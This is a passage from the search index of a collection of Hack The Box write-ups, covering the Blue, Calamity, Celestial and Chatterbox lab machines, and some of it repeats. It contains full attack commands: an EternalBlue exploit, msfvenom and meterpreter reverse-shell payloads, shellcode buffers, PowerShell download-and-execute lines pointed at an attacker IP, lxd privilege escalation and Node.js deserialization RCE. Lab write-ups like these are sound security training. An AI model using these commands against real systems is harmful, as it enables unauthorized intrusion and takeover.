vulnerability scan scripts to determine if any of the services are vulnerable. nmap --script vuln -oA vuln 10.10.10.40 The box is vulnerable to EternalBlue! And guess what the EternalBlue exploit does? It gives me system access, so this box won\u2019t be too difficult to solve. If you\u2019re not familiar with EternalBlue, it exploits Microsoft\u2019s implementation of the Server Message Block (SMB) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine. Exploitation Search for a non Metasploit exploit in the Exploit Database. searchsploit --id MS17-010 We\u2019re working with Windows 7 so we\u2019ll use exploit # 42315. Clone the exploit into the working directory. searchsploit -m 42315 After looking at the source code, we need to do three things: Download mysmb.py since the exploit imports it. The download location is included in the exploit. Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you\u2019re not using meterpreter). Make changes in the exploit to add the authentication credentials and the reverse shell payload. First, download the file and rename it to mysmb.py wget [https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py](https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py) mv 42315.py.1 mysmb.py Second, use MSFvenom to generate a simple executable with a reverse shell payload. msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.6 LPORT=4444 eternal-blue.exe Third, we need change the exploit to add credentials. In our case we don\u2019t have valid credentials, however, let\u2019s check to see if guest login is allowed. If you run enum4linux, you can see that guest login is supported. enum4linux -a 10.10.10.40 -a : Do all simple enumeration We\u2019ll add that to the exploit script. Similarly, we\u2019ll add the reverse shell executable location and get the script to execute it. Now that we\u2019re done all three tasks, setup a listener on your attack machine. nc -nlvp 4444 Then run the exploit. python 42315.py 10.10.10.40 We have a shell with system privileges! Grab the user flag. Grab the root flag. Lessons Learned I keep repeating this in most of my HTB writeup blogs and I\u2019ll say it again, it goes without saying that you should always update your systems especially when updates are released for critical vulnerabilities! If the system administrator had installed the MS17\u2013010 security update, I would have had to find another way to exploit this machine. Conclusion 11 machines down, 30 more to go!","title":"3. Blue Writeup w/o Metasploit.md"},{"location":"Retired/Blue Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.40 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that nine ports are open: Port 139: running Microsoft Windows netbiois-ssn Port 445: running microsoft-ds Ports 135, 49152, 49153, 49154, 49155, 49156 49157: running msrpc Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA full 10.10.10.40 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA udp 10.10.10.40 I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports.","title":"Reconnaissance"},{"location":"Retired/Blue Writeup wo Metasploit/#enumeration","text":"As usual, we\u2019ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable. nmap --script vuln -oA vuln 10.10.10.40 The box is vulnerable to EternalBlue! And guess what the EternalBlue exploit does? It gives me system access, so this box won\u2019t be too difficult to solve. If you\u2019re not familiar with EternalBlue, it exploits Microsoft\u2019s implementation of the Server Message Block (SMB) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.","title":"Enumeration"},{"location":"Retired/Blue Writeup wo Metasploit/#exploitation","text":"Search for a non Metasploit exploit in the Exploit Database. searchsploit --id MS17-010 We\u2019re working with Windows 7 so we\u2019ll use exploit # 42315. Clone the exploit into the working directory. searchsploit -m 42315 After looking at the source code, we need to do three things: Download mysmb.py since the exploit imports it. The download location is included in the exploit. Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you\u2019re not using meterpreter). Make changes in the exploit to add the authentication credentials and the reverse shell payload. First, download the file and rename it to mysmb.py wget [https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py](https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py) mv 42315.py.1 mysmb.py Second, use MSFvenom to generate a simple executable with a reverse shell payload. msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.6 LPORT=4444 eternal-blue.exe Third, we need change the exploit to add credentials. In our case we don\u2019t have valid credentials, however, let\u2019s check to see if guest login is allowed. If you run enum4linux, you can see that guest login is supported. enum4linux -a 10.10.10.40 -a : Do all simple enumeration We\u2019ll add that to the exploit script. Similarly, we\u2019ll add the reverse shell executable location and get the script to execute it. Now that we\u2019re done all three tasks, setup a listener on your attack machine. nc -nlvp 4444 Then run the exploit. python 42315.py 10.10.10.40 We have a shell with system privileges! Grab the user flag. Grab the root flag.","title":"Exploitation"},{"location":"Retired/Blue Writeup wo Metasploit/#lessons-learned","text":"I keep repeating this in most of my HTB writeup blogs and I\u2019ll say it again, it goes without saying that you should always update your systems especially when updates are released for critical vulnerabilities! If the system administrator had installed the MS17\u2013010 security update, I would have had to find another way to exploit this machine.","title":"Lessons Learned"},{"location":"Retired/Blue Writeup wo Metasploit/#conclusion","text":"11 machines down, 30 more to go!","title":"Conclusion"},{"location":"Retired/Calamity Writeup/","text":"Level: Intermediate Task: find user.txt and root.txt file on victim\u2019s machine. Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.27 so let\u2019s begin with nmap port enumeration. From given below image, you can observe we found port 22 and 80 are open in victim\u2019s network. As port 80 is running HTTP on the target machine, so we open the IP address in our browser. We don\u2019t find anything on the homepage so we use dirb to enumerate the directories. Now we open admin.php, and find a login page. We take a look at the source page but we don\u2019t find anything. When we use curl to access the page we find a password commented in the HTML page. curl -v http://10.10.10.27/admin.php We try the username admin and the password we find on the page to login to the page. We then get access to a page that allows us to run php code in it. We first try to execute normal PHP payload but are unable to get a stable tty shell, so we use base64 encoded php shell to exploit this web application. We generate a base64 encoded shell using metasploit. msfvenom -p php/meterpreter/reverse_tcp lhost\\=10.10.14.3 lport\\=4444 -e php/base64 -f raw We paste this shell in the target machine\u2019s page between ?php ? tag. We setup our listener using metasploit to get reverse shell. As soon as we run our shell on the page we get the reverse shell. msf > use exploit/multi/handler msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 10.10.14.3 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit After getting reverse shell we enumerate through the directories, in /home/xalvas we find a file called user.txt. When we open user.txt we find our first flag. We also find a file called recov.wav; we download it to our system to gain further information. download recov.wav /root/Desktop We go to alarmclocks directory inside the xalvas directory and find 1 mp3 and 1 wav file. We download both files into our system. download rick.wav /root/Desktop/ download xouzouris.mp3 /root/Desktop/ We use a tool called audacity to perform steganography on the audio files. Listening to the audio we find 2 of them sound similar. We load recov.wav and rick.wav into audacity, invert rick.wav then export the combination of both. After combining both the files we find a password in the audio \u201c 18547936..* \u201d We use the username as xalvas and password that we found in the audio file to log in through ssh into the target machine. When we run id command we find that the user is added in lxd group. As lxd is a container technology we can run processes as root using lxd. To exploit this we download \u201clxd alpine builder\u201d to create an image of alpine Linux. git clone https://github.com/saghul/lxd-alpine-builder.git Now create a 32-bit Alpine Linux image using lxd alpine builder. We send the Linux image to the target machine using scp. scp alpine-v3.7-i686-20180405_0501.tar.gz xalvas@10.10.10.27: We go to the target machine and import the Linux image and create an image called ignite with administrative privileges. mkdir raj mv alpine-v3.7-i686-20180405_0501.tar.gz raj lxc image import alpine-v3.7-i686-20180405_0501.tar.gz --alias alpine lxc image list lxc init alpine ignite -c security.privileged\\=true We mount the whole filesystem into the container; we start the container and execute the shell the shell inside. After spawning the shell we open root.txt in /mnt/root/root directory and find the final flag. lxc config device add ignite mydevice mydevice disk source\\=/ path\\=/mnt/root recursive\\=true lxc start ignite lxc exec ignite /bin/sh","title":"5. Calamity Writeup.md"},{"location":"Retired/Celestial Writeup/","text":"Celestial Write-up (HTB) This is a write-up for the recently retired Celestial machine on the Hack The Box platform. If you don\u2019t already know, Hack The Box is a website where you can further your cyber security knowledge by hacking into a range of different machines. At any stage in the write-up, you can click on a command to be redirected to a page which describes what the command does. TL;DR: Node.js Serialization Vulnerabilities. | Celestial was a really fun box to do, since it was very well-structured and there was little guesswork involved. Although the priv-esc was a simple root crontab exploit, I learnt a lot about serialization vulnerabilities whilst getting the user flag. PART ONE: USER Our initial nmap scan revealed only one open port: We now know that the server is running Node.js Express, with port 3000 service HTTP. Right, so we\u2019ve got a page that we can open in the browser, but no SSH port (or anything to that effect), so we know straight away that we don\u2019t have to be on the lookout for credentials or SSH keys. At first, visiting the page seems to just throw a 404 error: However, on refresh, we are presented with something entirely different: From this, we can work out that there is clearly some form of cookie being given and then used here. Let\u2019s see what Burp has to say about this: We can see the following cookie: eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D I then sent this request onto the Repeater with CTRL+R, to manipulate the cookie a little. Once there, we can decode the cookie by highlighting it and pressing CTRL+SHIFT+U (to URL decode it), and CTRL+SHIFT+B (to Base64 decode it). As shown, the cookie is: {\u201cusername\u201d:\u201dDummy\u201d,\u201dcountry\u201d:\u201dIdk Probably Somewhere Dumb\u201d,\u201dcity\u201d:\u201dLametown\u201d,\u201dnum\u201d:\u201d2 } So, we can manipulate this, re-encode it and then send it back to receive a matching output: I then spent some time messing around with different values, looking for some form of command injection, however nothing was immediately visible. After some time blindly trying to inject something, I searched for related exploits online: Well, this looks promising enough. The first link contains a fairly in-depth explanation of the exploit, but I will briefly go over the steps here too. We first need to generate a payload using a script that can be found here , as shown: We then have to serialize this output. Since I couldn\u2019t find an easy way to do this, I instead just did it manually. I know this sounds dumb, but it\u2019s actually way easier than it sounds. Essentially, we just have to add\u2026 **{\u201crce\u201d:\u201d_$$ND_FUNC$$_function (){** \u2026to the start of the string, and add\u2026 **}() }** \u2026to the end. We then copy this serialized string and put it in as the profile cookie in Burp, and Base64/URL encode it: Sending this doesn\u2019t return an output, and so it may have executed code instead. I then opened up a simple netcat listener to catch the callback, before launching the request again: And with that, we\u2019re connected! We can then launch a proper terminal with python: PART TWO: ROOT Interestingly, there is another file in the Documents folder: This script contains nothing but one line. $ cat script.py print Script is running... We\u2019ve seen similar scripts in previous boxes, and these scripts all seem to run as root. As such, I wrote a short script to read the root flag, and write it to a file: I chose a really obscure directory to write the flag to because the machine is public, and so I didn\u2019t want other people stumbling across the flag before I had time to delete it. I then downloaded this to the box by serving it via a SimpleHTTPServer: After around a minute, the root flag appeared in the errors.log file that I specified in the script: As such, we have the root flag!","title":"29. Celestial Writeup.md"},{"location":"Retired/Celestial Writeup/#celestial-write-up-htb","text":"This is a write-up for the recently retired Celestial machine on the Hack The Box platform. If you don\u2019t already know, Hack The Box is a website where you can further your cyber security knowledge by hacking into a range of different machines. At any stage in the write-up, you can click on a command to be redirected to a page which describes what the command does. TL;DR: Node.js Serialization Vulnerabilities. | Celestial was a really fun box to do, since it was very well-structured and there was little guesswork involved. Although the priv-esc was a simple root crontab exploit, I learnt a lot about serialization vulnerabilities whilst getting the user flag.","title":"Celestial Write-up (HTB)"},{"location":"Retired/Celestial Writeup/#part-one-user","text":"Our initial nmap scan revealed only one open port: We now know that the server is running Node.js Express, with port 3000 service HTTP. Right, so we\u2019ve got a page that we can open in the browser, but no SSH port (or anything to that effect), so we know straight away that we don\u2019t have to be on the lookout for credentials or SSH keys. At first, visiting the page seems to just throw a 404 error: However, on refresh, we are presented with something entirely different: From this, we can work out that there is clearly some form of cookie being given and then used here. Let\u2019s see what Burp has to say about this: We can see the following cookie: eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D I then sent this request onto the Repeater with CTRL+R, to manipulate the cookie a little. Once there, we can decode the cookie by highlighting it and pressing CTRL+SHIFT+U (to URL decode it), and CTRL+SHIFT+B (to Base64 decode it). As shown, the cookie is: {\u201cusername\u201d:\u201dDummy\u201d,\u201dcountry\u201d:\u201dIdk Probably Somewhere Dumb\u201d,\u201dcity\u201d:\u201dLametown\u201d,\u201dnum\u201d:\u201d2 } So, we can manipulate this, re-encode it and then send it back to receive a matching output: I then spent some time messing around with different values, looking for some form of command injection, however nothing was immediately visible. After some time blindly trying to inject something, I searched for related exploits online: Well, this looks promising enough. The first link contains a fairly in-depth explanation of the exploit, but I will briefly go over the steps here too. We first need to generate a payload using a script that can be found here , as shown: We then have to serialize this output. Since I couldn\u2019t find an easy way to do this, I instead just did it manually. I know this sounds dumb, but it\u2019s actually way easier than it sounds. Essentially, we just have to add\u2026 **{\u201crce\u201d:\u201d_$$ND_FUNC$$_function (){** \u2026to the start of the string, and add\u2026 **}() }** \u2026to the end. We then copy this serialized string and put it in as the profile cookie in Burp, and Base64/URL encode it: Sending this doesn\u2019t return an output, and so it may have executed code instead. I then opened up a simple netcat listener to catch the callback, before launching the request again: And with that, we\u2019re connected! We can then launch a proper terminal with python:","title":"PART ONE: USER"},{"location":"Retired/Celestial Writeup/#part-two-root","text":"Interestingly, there is another file in the Documents folder: This script contains nothing but one line. $ cat script.py print Script is running... We\u2019ve seen similar scripts in previous boxes, and these scripts all seem to run as root. As such, I wrote a short script to read the root flag, and write it to a file: I chose a really obscure directory to write the flag to because the machine is public, and so I didn\u2019t want other people stumbling across the flag before I had time to delete it. I then downloaded this to the box by serving it via a SimpleHTTPServer: After around a minute, the root flag appeared in the errors.log file that I specified in the script: As such, we have the root flag!","title":"PART TWO: ROOT"},{"location":"Retired/Chatterbox Writeup wo Metasploit/","text":"This is the 38th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.74 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.74 ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:27 EST root@kali:~/Desktop/htb/chatterbox# rm -r 10.10.10.74/ root@kali:~/Desktop/htb/chatterbox# nmapAutomator.sh 10.10.10.74 All Running all scans on 10.10.10.74 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:31 EST Nmap done: 1 IP address (1 host up) scanned in 101.53 seconds ---------------------Starting Nmap Basic Scan--------------------- No ports in quick scan.. Skipping! ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:33 EST Nmap scan report for 10.10.10.74 Host is up. All 1000 scanned ports on 10.10.10.74 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.64 seconds ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-20 22:36 EST Initiating Parallel DNS resolution of 1 host. at 22:36 Completed Parallel DNS resolution of 1 host. at 22:36, 0.12s elapsed Initiating SYN Stealth Scan at 22:36 Scanning 10.10.10.74 [65535 ports] Nmap scan report for 10.10.10.74 Host is up (0.043s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 9256/tcp open unknown Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 27674.79 seconds Raw packets sent: 131092 (5.768MB) | Rcvd: 148 (11.472KB) Making a script scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.042s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.035s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds Running Vuln scan on all ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-21 06:18 EST Nmap scan report for 10.10.10.74 Host is up (0.039s latency). PORT STATE SERVICE VERSION 9256/tcp open achat AChat chat system |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds ---------------------Finished all Nmap scans--------------------- We have one port open. Port 9256 :** **running AChat chat system Before we move on to enumeration, let\u2019s make some mental notes about the scan results. Port 9256 is running some kind of chat system that I\u2019m not familiar with, so the first we\u2019ll do is google it to figure out what it is. Then we\u2019ll run searchsploit on it to see if it is associated to any known vulnerabilities. Enumeration Doing a quick google search on the service tells us that AChat is a software that enables you to chat on your local network. It can also be used to share and send files/images to other users. Now that we know what it is, let\u2019s run searchsploit on it. It\u2019s vulnerable to a remote buffer overflow and there is both apython and metasploit exploit for it. We will of course work with the non-metasploit solution. Copy the python script to your current directory. searchsploit -m 36025 Looking at the exploit code we make note of the following things: It looks like your classic stack buffer overflow that allows you to overflow the buffer and include malicious shell code that will get executed on the box. The exploit author was nice enough to give us the msfvenom command that generates the malicious payload ( \u2018buf\u2019 variable) including the bad characters to avoid. This makes our life so much easier! The command simply spawns the calc.exe program on the target machine. So we\u2019ll have to change the command to send a reverse shell back to our attack machine. We also need to change the server_address to that of the IP address of Chatterbox. There seems to be a length limit of 1152 bytes on the payload. Anything that exceeds that will probably not work. We\u2019ll keep that in mind when using msfvenom to generate our reverse shell. Initial Foothold Use msfvenom to generate the reverse shell payload. msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python We get back the following result. Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 774 (iteration=0) x86/unicode_mixed chosen with final size 774 Payload size: 774 bytes Final size of python file: 3767 bytes buf = b buf += b \\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49 buf += b \\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41 buf += b \\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41 buf += b \\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51 buf += b \\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31 buf += b \\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41 buf += b \\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41 buf += b \\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41 buf += b \\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41 ......[truncated] The payload size is 774 bytes, so within the limit. Copy the payload and add it in place of the payload included in the exploit. Also change the IP address to Chatterbox\u2019s IP address. # Create a UDP socket sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) server_address = ( 10.10.10.74 , 9256) Then setup a listener on the attack machine to receive the reverse shell. nc -nlvp 1234 Run the exploit. root@kali:~/Desktop/htb/chatterbox# python 36025.py ---- {P00F}! We get a shell! Grab the user.txt flag. We\u2019re running as a low privileged user, so we\u2019ll need to escalate privileges. Privilege Escalation Display the user account information. Next, view all the users on the system. We have three users. The user we want to compromise is the Administrator account. Next, let\u2019s check the system privileges that are enabled for the Alfred user. SetImpersonatePrivilege is not enabled so we can\u2019t use the Juicy Potato exploit to escalate privileges. Run the systeminfo command. The box has 208 hotfixes installed so it\u2019s unlikely that we can escalate privileges using a kernel exploit (although it might be possible, I haven\u2019t checked). Let\u2019s see if we have access to the Administrator directory. We do. That\u2019s odd. Let\u2019s try and view the root.txt flag. We don\u2019t have permission. View the permissions on the root.txt file. Only Administrator has full access (F) on this file. Let\u2019s view the permissions on the Desktop directory. We must have some kind of permission on it because we\u2019re able to enter it. We have full access (F) on the Desktop directory. The Alfred user is also configured to own the root.txt file. So we can simply grant ourselves access to it using the following command. View the permissions again to confirm that the change was made. Perfect! We should now be able to view the root.txt flag. Alright, all we did is view the root flag, we didn\u2019t really escalate privileges. Unfortunately our shell can\u2019t handle running PowerShell, so in the next section, we\u2019ll start from the beginning and send a PowerShell reverse shell back to our target machine and from there we\u2019ll escalate our privileges to Administrator . Extra Content: The PowerShell Solution View the options for PowerShell reverse shells in msfvenom. We\u2019ll go with the powershell_reverse_tcp option. msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python Unfortunately, this gives us a payload that is larger than the maximum size specified in the exploit. So instead, we\u2019ll just use the windows/exec module to download and execute the Nishang reverse shell. Download the Nishang repository and copy the Invoke-PowerShellTcp.ps1 script into your current directory. cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 . mv Invoke-PowerShellTcp.ps1 shell.ps1 Add the following line to the end of the script with the attack machine configuration settings. Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234 When called, this sends a reverse shell back to our attack machine on port 1234. Setup a listener to receive the reverse shell. nc -nlvp 1234 Next, use msfvenom to generate a payload that downloads the PowerShell script and executes it. msfvenom -a x86 --platform Windows -p windows/exec CMD= powershell -c iex(new-object net.webclient).downloadstring( [http://10.10.14.7:5555/shell.ps1 ](http://10.10.14.7:5555/shell.ps1 )) -e x86/unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister=EAX -f python We get back the following result. Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 684 (iteration=0) x86/unicode_mixed chosen with final size 684 Payload size: 684 bytes Final size of python file: 3330 bytes buf = b buf += b \\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49 buf += b \\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41 buf += b \\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41 buf += b \\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51 .....[redacted] Good! The payload size is 684 bytes, so it\u2019s within the limit. Copy the payload and add it in place of the payload included in the exploit. Start up a python server in the directory that the PowerShell script resides in. python -m SimpleHTTPServer 5555 Run the exploit. root@kali:~/Desktop/htb/chatterbox# python 36025.py ---- {P00F}! We get a PowerShell shell! We\u2019ll use the PowerUp.ps1 script to determine if there are any misconfigurations that lead to privilege escalation. Upload and run the script on the target machine. PS C:\\Users\\Alfred\\Desktop iex(new-object net.webclient).downloadstring( [http://10.10.14.7:5555/PowerUp.ps1 ](http://10.10.14.7:5555/PowerUp.ps1 )) PS C:\\Users\\Alfred\\Desktop Invoke-AllChecks We get back two interesting results. [*] Checking for Autologon credentials in registry... DefaultDomainName : DefaultUserName : Alfred DefaultPassword : Welcome1! AltDefaultDomainName : AltDefaultUserName : AltDefaultPassword : [*] Checking for unattended install files... UnattendPath : C:\\Windows\\Panther\\Unattend.xml Viewing the Unattend.xml file, we see that the password was redacted. So let\u2019s focus on the Autologon credentials. The default username is \u201c Alfred \u201d and the default password is \u201c Welcome1! \u201d. I don\u2019t have much experience with Windows, so I googled Autologin credentials to learn more about it. As stated in the article, these credentials are stored in the registry in plain text. The manual commands for extracting these credentials are: PS C:\\Windows\\system32 (Get-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName Alfred PS C:\\Windows\\system32 (Get-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword Welcome1! These credentials are set by the administrator. Since users have a tendency to reuse passwords, let\u2019s see if the administrator account is set to the same password. To do that, first run the following command to convert the plain text string \u201c Welcome1! \u201d into a secure string and store the result in the \\$password variable. $password = ConvertTo-SecureString Welcome1! -AsPlainText -Force ConvertTo-SecureString : Converts plain text to secure strings. -AsPlainText : Specifies a plain text string to convert to a secure string. -Force : Confirms that you understand the implications of using the AsPlainText parameter and still want to use it. Second, create a new object to store these credentials. $cred = New-Object System.Management.Automation.PSCredential( Administrator , $password) Third, we\u2019ll use these credentials to start PowerShell and send a (hopefully privileged) reverse shell back to our attack machine. In the attack machine, copy the shell.ps1 script we used earlier and save it in the file shell-admin.ps1 . cp shell.ps1 shell-admin.ps1 Change shell-admin.ps1 to send a reverse shell to our attack machine on port 6666. Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666 Setup a python server in the directory that the script resides in. python -m SimpleHTTPServer 5555 Setup a listener to receive the reverse shell. nc -nlvp 6666 On the target machine, use the credentials to start PowerShell to download the shell-admin.ps1 script, run it and send a reverse shell back to our attack machine. Start-Process -FilePath powershell -argumentlist IEX(New-Object Net.WebClient).downloadString( [http://10.10.14.7:5555/shell-admin.ps1 ](http://10.10.14.7:5555/shell-admin.ps1 )) -Credential $cred We get a shell with administrator privileges! Now we can view the root.txt flag without having to change the ACL permissions on it. Lessons Learned To gain an initial foothold on the box we exploited one vulnerability. Buffer Overflow vulnerability. The AChat chat service being used was vulnerable to a known remote buffer overflow vulnerability. This allowed us to execute shell code on the box and 